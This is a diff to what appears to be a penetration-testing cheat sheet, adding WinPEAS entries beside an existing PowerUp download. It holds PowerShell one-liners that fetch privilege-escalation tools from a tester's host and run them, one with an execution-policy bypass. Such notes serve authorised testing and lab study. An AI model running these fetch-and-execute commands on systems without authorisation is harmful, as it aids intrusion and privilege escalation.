@@ -46,3 +46,30 @@ PowerShell Download
 ```
 Invoke-WebRequest -Uri "http://192.168.10.10:8000/download/PowerUp.ps1" -OutFile "C:\Users\Administrator\Desktop\PowerUp.ps1"
 ```
+
+# WinPEAS
+
+Exe
+
+```powershell
+https://github.com/peass-ng/PEASS-ng/releases/download/20240602-829055f0/winPEASany.exe
+```
+
+Exe - Execution
+
+```powershell
+powershell -Command "iwr -Uri 'http://192.168.10.10:8888/winPEASx64.exe' -OutFile $env:temp\winPEASx64.exe; Start-Process $env:temp\winPEASx64.exe"
+```
+
+Ps1
+
+```powershell
+https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
+```
+
+Ps1 - Execution
+
+```powershell
+powershell -Command "iwr -Uri 'http://192.168.10.10:8888/winPEAS.ps1' -OutFile $env:temp\winPEAS.ps1; Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; & $env:temp\winPEAS.ps1"
+```
+```
